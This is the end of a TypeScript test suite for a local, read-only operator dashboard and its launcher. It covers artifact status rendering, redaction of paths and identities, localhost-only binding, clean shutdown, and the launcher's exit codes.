    writeFileSync(join(dir, CONSOLE_ARTIFACT_FILENAMES[237]![0]!), JSON.stringify(chain['238']!));              // misfiled
    const report = buildOperatorConsole(buildConsoleIntake({ dir }));
    const html = renderOperatorDashboardHtml(report);
    assertEq(report.artifacts.find((a) => a.phase === 234)!.status, 'MALFORMED', 'malformed');
    assertEq(report.artifacts.find((a) => a.phase === 236)!.status, 'DUPLICATE', 'duplicate');
    assertEq(report.artifacts.find((a) => a.phase === 237)!.status, 'MISFILED', 'misfiled');
    assert(html.includes('<td>MALFORMED</td>') && html.includes('<td>DUPLICATE</td>') && html.includes('<td>MISFILED</td>'), 'each state is named on the page');
    assert(html.includes('two artifacts claim this phase; neither is assumed'), 'and explained');
    assertEq(report.overall, 'AUDIT_INVALID', 'and the chain fails closed');
    assertNoLeak(html, 'mixed-defect page');
  } finally { rmSync(root, { recursive: true, force: true }); }
});

// ---------------------------------------------------------------------------------------------------------
// Redaction, and the surfaces this phase must not weaken
// ---------------------------------------------------------------------------------------------------------

await test('no path, filename, identity, timestamp, approval value or artifact value reaches any byte served', async () => {
  const root = workspace();
  let started: StartedDashboard | undefined;
  try {
    const dir = join(root, 'p227a');
    layout(dir, buildRealP227AChain());
    const report = buildOperatorConsole(buildConsoleIntake({ dir }));
    started = await serve(report);
    for (const path of ['/', '/healthz', '/status.json', '/manifest.json', '/nope']) {
      const res = await get(started, path);
      assertNoLeak(res.body, `body of ${path}`);
      assertNoLeak([...res.headers.entries()].map(([k, v]) => `${k}:${v}`).join('\n'), `headers of ${path}`);
    }
    assertNoLeak(JSON.stringify(buildDashboardManifest()), 'manifest');
    assertNoLeak(renderOperatorDashboardHtml(report), 'rendered page');
  } finally { await started?.close(); rmSync(root, { recursive: true, force: true }); }
});

test('the established operator UI surfaces are not relaxed to make room for this one', () => {
  // Phase 68/69: with no operator secret the static runtime still has no data route and no packet source.
  const closed = buildOperatorUiStaticRuntimeManifest();
  assert(closed.boundaries.includes('no-api-data-route'), 'no-api-data-route still stands');
  assert(closed.boundaries.includes('no-packet-source'), 'no-packet-source still stands');
  assert(closed.boundaries.includes('no-filesystem-artifact-read'), 'no-filesystem-artifact-read still stands');
  assertEq(closed.operatorAuth, 'not-implemented', 'and the packet route stays unauthenticated-and-absent');
  assert(!closed.routes.includes('GET /operator-ui/packets.json'), 'the packet route is not exposed by default');
  // And with one, the packet route is still auth-gated rather than opened.
  const authed = buildOperatorUiStaticRuntimeManifest({ operatorAuthEnabled: true });
  assertEq(authed.operatorAuth, 'local-secret-file-enabled', 'the auth gate is still the gate');
  assert(authed.boundaries.includes('sanitized-local-packet-endpoint-auth-gated'), 'and still sanitized and gated');
  // This dashboard is a SEPARATE surface: it declares its own boundaries and borrows none of theirs.
  const mine = buildDashboardManifest();
  assert(!mine.routes.some((r) => r.includes('packets.json')), 'the dashboard exposes no packet route');
  assertEq(mine.surface, 'local-read-only-promotion-record-dashboard', 'under its own surface name');
});

// ---------------------------------------------------------------------------------------------------------
// The launcher, end to end
// ---------------------------------------------------------------------------------------------------------

await test('shutdown is clean: the socket is released and the port is immediately reusable', async () => {
  const first = await serve(buildOperatorConsole({}));
  const port = first.port;
  assertEq((await get(first, '/healthz')).status, 200, 'listening');
  await first.close();
  await assertRejects(fetch(`http://127.0.0.1:${port}/healthz`), Error, 'nothing answers once closed');
  // Closing twice is not an error: shutdown must never be a thing that can itself fail.
  await first.close();
  // And the port is genuinely released -- proven by binding it again rather than by trusting the callback.
  const second = await serve(buildOperatorConsole({}), port);
  try { assertEq((await get(second, '/healthz')).status, 200, 'the same port binds again immediately'); }
  finally { await second.close(); }
});

interface Launched { readonly url: string; readonly stop: () => Promise<{ code: number | null; signal: NodeJS.Signals | null }>; readonly stdout: () => string; readonly stderr: () => string }

async function launch(args: readonly string[]): Promise<Launched> {
  const child = spawn(process.execPath, ['--import', 'tsx', cliPath, ...args], { cwd: projectRoot, stdio: ['ignore', 'pipe', 'pipe'] });
  let out = ''; let err = '';
  child.stdout.setEncoding('utf8'); child.stderr.setEncoding('utf8');
  child.stdout.on('data', (c: string) => { out += c; });
  child.stderr.on('data', (c: string) => { err += c; });
  const exited = new Promise<{ code: number | null; signal: NodeJS.Signals | null }>((resolve) => child.on('exit', (code, signal) => resolve({ code, signal })));
  const url = await new Promise<string>((resolve, reject) => {
    const timer = setTimeout(() => reject(new Error(`dashboard did not start: ${out}${err}`)), 60000);
    const check = setInterval(() => {
      const m = /http:\/\/127\.0\.0\.1:(\d+)\//.exec(out);
      if (m) { clearInterval(check); clearTimeout(timer); resolve(m[0]); }
    }, 100);
    void exited.then(() => { clearInterval(check); clearTimeout(timer); reject(new Error(`exited early (${err || out})`)); });
  });
  return {
    url,
    stop: async () => { child.kill('SIGTERM'); return exited; },
    stdout: () => out,
    stderr: () => err,
  };
}

await test('end to end: the launcher serves the ACTUAL P227-A chain as honestly open, and never as closed', async () => {
  const root = workspace();
  let app: Launched | undefined;
  try {
    const dir = join(root, 'p227a');
    layout(dir, buildRealP227AChain());
    app = await launch(['--dir', dir]);

    const page = await (await fetch(app.url)).text();
    assert(page.includes('<h2 id="outcome-h" class="code">AUDIT_OPEN</h2>'), 'the real chain reads AUDIT_OPEN');
    assert(page.includes('honestly unfinished') && page.includes('This is normal, not a defect'), 'presented as normal');
    assert(page.includes('Phase 232 -- present, but not finished'), 'the outstanding step is the undecided Phase 232');
    assert(page.includes('APPROVE or DECLINE'), 'and both directions of that decision are shown');
    assert(!page.includes('AUDIT_CLOSED</h2>'), 'it is NEVER headlined as closed');
    assert(page.includes('does NOT mean the promotion happened'), 'and the proof limits travel with it');

    const status = await (await fetch(`${app.url}status.json`)).json() as { overall: string; ok: boolean; nextRequiredPhase: number };
    assertEq(status.overall, 'AUDIT_OPEN', 'status agrees');
    assertEq(status.ok, true, 'an unfinished chain is healthy');
    assertEq(status.nextRequiredPhase, 232, 'and names the outstanding phase');

    assert(app.stdout().includes('bound to 127.0.0.1 only'), 'the launcher says where it bound');
    assert(app.stdout().includes('read-only snapshot taken at launch'), 'and that the snapshot is fixed');
    assertNoLeak(app.stdout(), 'launcher stdout');
    assertNoLeak(app.stderr(), 'launcher stderr');
    assertNoLeak(page, 'served page');

    // Clean shutdown. On POSIX the handler runs and the process exits 0; Windows terminates unconditionally
    // on SIGTERM and reports the signal instead. Either way the process must END and the socket must be gone
    // -- which is the property that actually matters, so it is asserted on both.
    const url = app.url;
    const { code, signal } = await app.stop();
    app = undefined;
    assert(code === 0 || signal === 'SIGTERM', `the launcher terminates on SIGTERM (code ${String(code)}, signal ${String(signal)})`);
    if (process.platform !== 'win32') assertEq(code, 0, 'and exits 0 where the signal is deliverable');
    await assertRejects(fetch(url), Error, 'and nothing is listening afterwards');
  } finally { await app?.stop(); rmSync(root, { recursive: true, force: true }); }
});

await test('end to end: a chain with no anchor serves NOT_ELIGIBLE and reports itself unhealthy', async () => {
  const root = workspace();
  let app: Launched | undefined;
  try {
    const chain = buildSyntheticChain(root);
    const dir = join(root, 'headless');
    const headless: Reports = { ...chain };
    delete headless['231'];
    layout(dir, headless);
    app = await launch(['--dir', dir]);
    const page = await (await fetch(app.url)).text();
    assert(page.includes('<h2 id="outcome-h" class="code">NOT_ELIGIBLE</h2>'), 'no anchor, nothing to audit against');
    assert(page.includes('there is no operation identity'), 'and the page explains why that ends it');
    const res = await fetch(`${app.url}status.json`);
    assertEq(res.status, 503, 'and the status contract reports it unhealthy');
    assertEq(((await res.json()) as { ok: boolean }).ok, false, 'explicitly');
  } finally { await app?.stop(); rmSync(root, { recursive: true, force: true }); }
});

await test('the launcher fails gracefully before anything listens, and never echoes the path it was given', () => {
  const root = workspace();
  try {
    const run = (args: readonly string[]) => spawnSync(process.execPath, ['--import', 'tsx', cliPath, ...args], { cwd: projectRoot, encoding: 'utf8', timeout: 120000 });
    const missing = run(['--dir', join(root, 'no-such-DASHMARKER-directory')]);
    assertEq(missing.status, 2, 'a missing directory exits 2');
    assert(!(missing.stdout ?? '').includes('http://'), 'nothing ever listened');
    assertNoLeak(missing.stderr ?? '', 'missing-directory stderr');

    const badBundle = run(['--bundle', join(root, 'no-such.json')]);
    assertEq(badBundle.status, 2, 'a missing bundle exits 2');
    assertNoLeak(badBundle.stderr ?? '', 'missing-bundle stderr');

    const dir = join(root, 'ok'); layout(dir, buildRealP227AChain());
    assertEq(run(['--dir', dir, '--port', '80']).status, 2, 'a privileged port exits 2');
    assertEq(run(['--dir', dir, '--port', 'abc']).status, 2, 'a non-numeric port exits 2');
    assertEq(run(['--dir', dir, '--bundle', join(root, 'x.json')]).status, 2, 'two intakes is a usage error');
    assertEq(run([]).status, 2, 'no arguments is a usage error');

    const help = run(['--help']);
    assertEq(help.status, 0, '--help exits 0');
    for (const phrase of ['usage: npx tsx src/ops/promotion-operator-dashboard-cli.ts', 'npm run ops:promotion-operator-dashboard:help', 'binds to 127.0.0.1 and nowhere else', 'read ONCE, before the server starts listening', 'does NOT mean the promotion happened']) {
      assert((help.stdout ?? '').includes(phrase), `--help states: ${phrase}`);
    }
  } finally { rmSync(root, { recursive: true, force: true }); }
});

console.log(`\n${passed} passed, ${failed} failed.`);
if (failed > 0) {
  console.log('\nFailures:');
  for (const [name, err] of failures) console.log(`  - ${name}: ${(err as Error).stack ?? err}`);
  process.exit(1);
}
